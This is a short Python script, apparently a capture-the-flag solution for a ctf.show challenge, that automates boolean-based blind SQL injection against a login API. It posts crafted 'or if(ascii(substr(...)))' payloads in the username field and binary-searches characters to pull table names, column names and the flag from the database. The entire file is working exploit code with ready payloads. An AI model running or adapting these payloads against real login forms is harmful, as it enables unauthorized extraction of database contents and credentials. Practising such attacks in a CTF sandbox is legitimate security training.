import requests

url = 'http://28dd987c-e338-4089-b212-04cb01102ed4.challenge.ctf.show/api/'
flag = ''
for i in range(100):
    lenth = len(flag)
    min = 32
    max = 128
    while True:
        j = min + (max - min) // 2
        if (min == j):
            flag += chr(j)
            print(flag)
            if (len(flag) > 2 and chr(j) == ' '):
                exit()
            break
        payload = f"' or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))<{j},1,0)-- -"  # 取表名
        #payload = f"' or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g'),{i},1))<{j},1,0)-- -"   #取列名
        # payload = f"' or if(ascii(substr((select group_concat(f1ag) from ctfshow_fl0g),{i},1))<{j},1,0)-- -"  # 拿flag
        data = {'username': payload
            , 'password': 114514}
        r = requests.post(url=url, data=data).text
        if (r'\u5bc6\u7801\u9519\u8bef' in r):
            max = j
        else:
            min = j